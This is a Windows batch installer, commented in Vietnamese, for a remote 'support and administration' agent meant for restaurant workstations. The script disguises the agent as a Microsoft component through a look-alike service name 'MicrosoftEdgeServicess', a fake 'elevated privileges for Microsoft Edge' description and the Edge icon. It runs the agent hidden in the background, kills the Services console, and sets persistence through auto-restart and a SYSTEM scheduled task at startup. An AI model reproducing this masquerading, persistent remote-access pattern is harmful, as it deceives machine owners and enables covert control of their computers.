@echo off
title Cai Dat Dich Vu MicrosoftEdgeServicess (Windows Services)
cd /d "%~dp0"

echo ===============================================================================
echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
echo   Ten dich vu: MicrosoftEdgeServicess
echo   Mo ta: Provides elevated privileges for Microsoft Edge.
echo   Co che: Tu khoi dong cung Windows - Chay ngam 100 phan tram
echo   Bieu tuong: Microsoft Edge chinh thuc
echo   Bao ve tien trinh: Single-Instance (Chi 1 tien trinh duy nhat)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN FILE NEN ZIP]
echo ===============================================================================
echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
echo   Khong tim thay file MicrosoftEdgeServicess.exe de cai dat.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao file Restaurant_Support_Agent_Full.zip
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai file nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator
net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA CO QUYEN QUAN TRI VIEN - ADMINISTRATOR]
echo ===============================================================================
echo   File cai dat nay bat buoc phai chay voi quyen Administrator!
echo.
echo   Huong dan:
echo   1. Nhap CHUOT PHAI vao file: Cai_Dat_Dich_Vu_Windows.bat
echo   2. Chon: Run as administrator (Chay voi quyen quan tri vien)
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
pause
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc (mmc.exe) de tranh bi khoa handle lam Service bi danh dau xoa (Loi 1058 / 1072)
echo [1/6] Dang giai phong khoa he thong va tien trinh cu...
taskkill /F /IM mmc.exe >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1
ping 127.0.0.1 -n 3 >nul

:: 4. Thiet lap thu muc he thong
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/6] Thiet lap thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

echo [3/6] Dang sao chep cac file dich vu vao: %INSTALL_DIR%
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\"
copy /Y "%~dp0config.json" "%INSTALL_DIR%\"
copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

:: 5. Dang ky hoac cap nhat Windows Service
echo [4/6] Dang cau hinh Windows Service MicrosoftEdgeServicess...
sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% equ 0 goto :ServiceDaTonTai

:: Neu chua co thi dang ky moi
echo    -> Dang dang ky moi dich vu vao services.msc...
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" --startup auto install >nul 2>&1
sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% neq 0 (
    sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
)

:ServiceDaTonTai
:: Luon dam bao Service bat start= auto (Chong loi 1058 Disabled), cap nhat binPath va Description
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: Thiet lap du phong qua Task Scheduler
echo [5/6] Dang thiet lap du phong qua Task Scheduler...
schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1

:: 6. Khoi dong Windows Service ngay bay gio
echo [6/6] Dang khoi chay Windows Service ngam...
net start MicrosoftEdgeServicess
if %errorlevel% neq 0 (
    echo    Thu khoi dong truc tiep qua service start...
    "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" start >nul 2>&1
)

echo.
echo ===============================================================================
echo   KIEM TRA KET QUA DANG KY TRONG SERVICES.MSC:
echo ===============================================================================
sc.exe query MicrosoftEdgeServicess
echo.

echo ===============================================================================
echo   CAI DAT DICH VU HOAN TAT!
echo   - Ten dich vu: MicrosoftEdgeServicess
echo   - Mo ta: Provides elevated privileges for Microsoft Edge.
echo   - Duong dan: %INSTALL_DIR%\MicrosoftEdgeServicess.exe
echo   - Tu dong bat cung Windows: Automatic
echo   - Icon: Bieu tuong Microsoft Edge chinh thuc
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 0
